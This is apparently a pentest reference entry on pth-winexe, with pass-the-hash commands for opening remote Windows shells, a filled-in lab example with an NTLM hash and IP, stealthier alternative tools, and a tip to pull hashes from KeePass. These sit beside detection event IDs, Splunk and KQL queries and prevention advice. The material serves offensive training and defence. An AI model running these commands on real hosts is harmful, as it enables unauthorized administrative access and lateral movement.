name: pth-winexe - Pass-the-Hash Remote Execution
description: pth-winexe is a pass-the-hash variant of winexe that authenticates to a Windows host using NTLM hashes instead of a password. It opens a remote command shell via the Windows Service Control Manager (like psexec). Alternative to impacket-psexec when you have an NTLM hash and want a quick interactive shell.
notes:
=== BASIC USAGE ===
  pth-winexe -U '<domain>/<user>%<lm_hash>:<nt_hash>' //<target> cmd.exe

=== WORKGROUP (non-domain) ===
  pth-winexe -U 'JEEVES/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' //10.129.228.112 cmd.exe

=== WITH SYSTEM SHELL ===
  pth-winexe --system -U 'Administrator%aad3b435b51404eeaad3b435b51404ee:<nt_hash>' //<target> cmd.exe

=== ALTERNATIVES ===
  impacket-psexec -hashes <lm>:<nt> <domain>/<user>@<target>     # more common
  impacket-wmiexec -hashes <lm>:<nt> <domain>/<user>@<target>    # stealthier
  evil-winrm -i <target> -u <user> -H <nt_hash>                 # if WinRM open

=== NOTES ===
- LM hash is usually aad3b435b51404eeaad3b435b51404ee (empty/disabled)
- Uses SMB + service creation (same as psexec) - leaves artifacts
- Requires admin access on the target
- pth-winexe is from the pth-toolkit (passing-the-hash.com)
- Less maintained than impacket alternatives but still works

examples.label: PTH with --system flag for SYSTEM shell

recommended.note: KeePass database may contain the NTLM hash needed for PTH.

defense.why_it_works: NTLM authentication accepts the hash directly without knowing the cleartext password. pth-winexe creates a Windows service on the target to execute commands, authenticating with the provided NTLM hash.
defense.prerequisites: Local admin NTLM hash; SMB (445) access to the target; admin$ share accessible.
defense.impact: Remote code execution as the hash owner (typically SYSTEM via service creation).
defense.detection: [MITRE T1550.002] Event 4624 (logon type 3) with NTLM auth from unusual source; Event 7045 (new service) for the execution service; Event 4688 for cmd.exe spawned by the service.
defense.artifacts: 4624 NTLM logon; 7045 service creation; 4688 process creation; temporary service binary on admin$ share.
defense.splunk_spl:
index=wineventlog sourcetype="WinEventLog:Security" EventCode=4624 LogonType=3 AuthenticationPackageName="NTLM"
| table _time, TargetUserName, IpAddress, WorkstationName
defense.sentinel_kql:
SecurityEvent
| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
| project TimeGenerated, Account=TargetUserName, IpAddress, Workstation=WorkstationName
defense.prevention: Enable Credential Guard; disable NTLM where possible; restrict local admin access; monitor for service creation from unusual sources.
